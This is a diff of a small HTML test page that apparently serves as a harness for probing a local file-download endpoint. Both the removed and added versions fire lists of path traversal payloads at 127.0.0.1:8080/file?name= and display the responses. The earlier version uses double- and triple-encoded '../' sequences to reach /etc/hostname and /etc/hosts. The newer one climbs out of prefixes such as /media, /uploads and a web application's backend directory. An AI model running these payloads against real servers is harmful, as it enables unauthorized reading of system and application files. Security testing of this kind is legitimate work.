@@ -1,11 +1,4 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CASI layered decode v29</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>Layered decode results</h1><div id="o"></div><script>
-const b='http://127.0.0.1:8080/file?name=',t=[
-['double-all','%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname'],
-['mix-a','%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252fetc%252fhostname'],
-['mix-b','%252e%2e%252f%252e%2e%252f%252e%2e%252f%252e%2e%252fetc%252fhostname'],
-['dot-double-slash','..%252f..%252f..%252f..%252f..%252f..%252fetc%252fhostname'],
-['double-dot-raw-slash','%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/hostname'],
-['triple-all','%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fhostname'],
-['double-hosts','%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts']];
-(async()=>{await Promise.all(t.map(async([l,u])=>{let s='';try{const r=await fetch(b+u,{cache:'no-store'}),x=await r.text();s=l+' STATUS='+r.status+' BODY='+JSON.stringify(x.slice(0,1000));}catch(e){s=l+' ERROR='+e.name+':'+e.message}const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}))})();
+<!doctype html><html><head><meta charset="utf-8"><title>CASI storage prefix v31</title><style>body{font:13px monospace}pre{white-space:pre-wrap;border:1px solid #333;padding:6px}</style></head><body><h1>Storage-prefix traversal results</h1><div id="o"></div><script>
+const t=[['media-abs','/media/../../../../../../etc/hostname'],['media-rel','media/../../../../../../etc/hostname'],['storage','/storage/../../../../../../etc/hostname'],['data','/data/../../../../../../etc/hostname'],['uploads','/uploads/../../../../../../etc/hostname'],['offline','/var/www/html/Pilot7/offline_reports/../../../../../../../../etc/hostname'],['backend','/var/www/html/Pilot7/backend/../../../../../../../../etc/hostname']];
+(async()=>{await Promise.all(t.map(async([l,n])=>{let s='';try{const r=await fetch('http://127.0.0.1:8080/file?name='+encodeURIComponent(n),{cache:'no-store'}),x=await r.text();s=l+' STATUS='+r.status+' BODY='+JSON.stringify(x.slice(0,1000));}catch(e){s=l+' ERROR='+e.name+':'+e.message}const p=document.createElement('pre');p.textContent=s;document.getElementById('o').appendChild(p)}))})();
 </script></body></html>
